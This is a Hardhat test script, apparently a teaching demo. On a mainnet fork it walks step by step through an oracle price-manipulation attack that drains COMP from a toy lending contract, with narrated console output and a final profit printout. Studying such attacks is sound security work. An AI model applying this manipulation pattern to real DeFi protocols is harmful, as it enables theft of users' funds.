const { ethers } = require("hardhat");

const IERC20_SOURCE = '@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20';

describe('Attack Tests',() => {
  let defi;
  let owner;
  let attacker;
  let someone;
  let wethContract;
  let compContract;
  let swap;
  let compTokens;
  let whaleSigner;
  const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
  const COMP_ADDRESS = '0xc00e94Cb662C3520282E6f5717214004A7f26888'
  let COMP_WHALE = "0xfbe18f066F9583dAc19C88444BC2005c99881E56"
  beforeEach(async () => {
    [owner, attacker, someone] = await ethers.getSigners();
    const Defi = await ethers.getContractFactory("LendingProtocol");
    defi = await Defi.deploy();
    await defi.deployed();

    const Swap = await ethers.getContractFactory("Swap");
    swap = await Swap.deploy();
    await swap.deployed();

    wethContract = await hre.ethers.getContractAt(
      IERC20_SOURCE,
      WETH_ADDRESS
    );
    compContract = await hre.ethers.getContractAt(
      IERC20_SOURCE,
      COMP_ADDRESS
    );

    //impersonating Whale
    await hre.network.provider.request({
      method: 'hardhat_impersonateAccount',
      params: [COMP_WHALE],
    });

    //get signer of whale
     whaleSigner = ethers.provider.getSigner(COMP_WHALE);

    compTokens = ethers.utils.parseEther('10000.0')//ethers.BigNumber.from(10000).mul(18);
    await compContract.connect(whaleSigner).transfer(owner.address, compTokens);
    

  })


  it("Attack V2", async () => {
    console.log("================ First Step ================");
    console.log("Our Lending Protocol Does not have any assets. Let's first give it some assets");
    console.log("Sending 5000 ETHER and 50,000 COMP Tokens to Our Lending Protocol")
    await owner.sendTransaction({
      to: defi.address,
      value: ethers.utils.parseEther('5000.0'), 
      gasLimit: 300000,
    });
    compTokens = ethers.utils.parseEther('50000.0')
    await compContract.connect(whaleSigner).transfer(defi.address, compTokens);
    console.log("COMP in Lending Protocol ==>", (await compContract.balanceOf(defi.address)/10**18));
    console.log("ETH in Lending Protocol=>" ,(await ethers.provider.getBalance(defi.address))/10**18);
    console.log("Lending Protocol is Ready!");


    console.log("=========================================================")
    console.log("=========================================================")

    console.log("================ Second Step ============================");
    console.log("Attacker Borrows 50,000 COMP from Whale")
    await compContract.connect(whaleSigner).transfer(attacker.address, compTokens);
    let balanceBefore = (await ethers.provider.getBalance(attacker.address))/10**18;
    console.log("Attacker's ETH Before the attack=>" ,balanceBefore)
    console.log("Attacker's COMP Before the attack=>" ,(await compContract.balanceOf(attacker.address)/10**18))

    console.log("=========================================================")
    console.log("=========================================================")

    console.log("================ Third Step =============================");
    console.log("Attacker will Manupulate the price of ETH/COMP Pair by Buying ETH and supplying COMP")
    console.log("COMP rate per ETH on uniswap Before Swapping =>", (await swap.getRateUni())/10**18)
    console.log("Sending 10,000 COMP Tokens to Uniswap and swapping it for ETH")
    let amt = ethers.utils.parseEther('10000.0')
    await compContract.connect(attacker).transfer(swap.address, amt);
    await swap.connect(attacker).swapETHForCOMP(amt);
    console.log("COMP rate per ETH on uniswap After Swapping =>", (await swap.getRateUni())/10**18)
    console.log("Attacker's ETH After Manipulation=>" , (await ethers.provider.getBalance(attacker.address))/10**18)
    console.log("Attacker's COMP After Manipulation=>" ,(await compContract.balanceOf(attacker.address)/10**18))


    console.log("=========================================================")
    console.log("=========================================================")

    console.log("================ Fourth Step =============================");
    console.log("Since the rate per eth is now far more than before, The Attack will Work")
    console.log("Attacker now begins the attack by Supplying ETH to Lending Protocol and getting back COMP tokens")

    console.log("COMP in Lending Protocol before attacker swaps 20 ETH for COMP ==>", (await compContract.balanceOf(defi.address)/10**18));
    console.log("ETH in Lending Protocol before attacker swaps 20 ETH for COMP=>" ,(await ethers.provider.getBalance(defi.address))/10**18);

    await defi.connect(attacker).LendCOMPforETH({value: ethers.utils.parseEther('20')})

    console.log("COMP in Lending Protocol after attacker swaps 20 ETH for COMP ==>", (await compContract.balanceOf(defi.address)/10**18));
    console.log("ETH in Lending Protocol after attacker swaps 20 ETH for COMP=>" ,(await ethers.provider.getBalance(defi.address))/10**18);


    console.log("=========================================================")
    console.log("=========================================================")

    console.log("================ Fifth Step =============================");
    console.log("Attacker repays 50,000 COMP to the whale")
    console.log("Attacker's ETH Before Repaying Whale=>" ,(await ethers.provider.getBalance(attacker.address))/10**18)
    console.log("Attacker's COMP Before Repaying Whale=>" ,(await compContract.balanceOf(attacker.address)/10**18))

    await compContract.connect(attacker).transfer(owner.address, compTokens);

    console.log("Attacker's ETH After Repaying Whale=>" ,(await ethers.provider.getBalance(attacker.address))/10**18)
    console.log("Attacker's COMP After Repaying Whale=>" ,(await compContract.balanceOf(attacker.address)/10**18))


    console.log("=========================================================")
    console.log("=========================================================")

    console.log("================ Sixth Step =============================");
    console.log("Finally Swaps the Remaining COMP to ETH...");
    let balanceCOMP = await compContract.balanceOf(attacker.address);
    await compContract.connect(attacker).transfer(swap.address, balanceCOMP);
    await swap.connect(attacker).swapETHForCOMPSushi(balanceCOMP);

    let balanceAfter = (await ethers.provider.getBalance(attacker.address))/10**18;
    console.log("Attackers Final ETH After the attack=>" ,balanceAfter)
    console.log("=============================")
    console.log("=============================")
    console.log("FINAL PROFIT => ", balanceAfter - balanceBefore);
    console.log("=============================")
    console.log("=============================")
  })
})